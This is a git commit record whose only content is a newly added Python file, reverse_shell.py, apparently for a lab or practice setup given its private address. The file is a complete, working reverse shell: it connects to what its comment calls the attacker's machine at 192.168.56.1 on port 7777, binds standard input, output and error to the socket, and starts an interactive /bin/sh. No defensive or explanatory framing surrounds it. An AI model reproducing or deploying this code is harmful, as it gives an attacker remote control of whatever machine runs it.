3b7e03887b1115bb3dfc5a270b15b8cd71aceee4
Yannos Papaevangelou <nospapa57@gmail.com>
2025-04-20 12:54:03 -0400

    Add files via upload

---
+++ reverse_shell.py
@@ -0,0 +1,20 @@
+#import modules
+import socket
+import subprocess
+import os
+
+#create tcp socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+#connect to attackers machine at ip 192.168.56.1, on port 7777
+s.connect(("192.168.56.1", 7777))
+
+#redirect standard input, output, and error to the socket
+os.dup2(s.fileno(), 0)
+
+os.dup2(s.fileno(), 1)
+
+os.dup2(s.fileno(), 2)
+
+#launch interactive shell
+p = subprocess.call(["/bin/sh", "-i"])
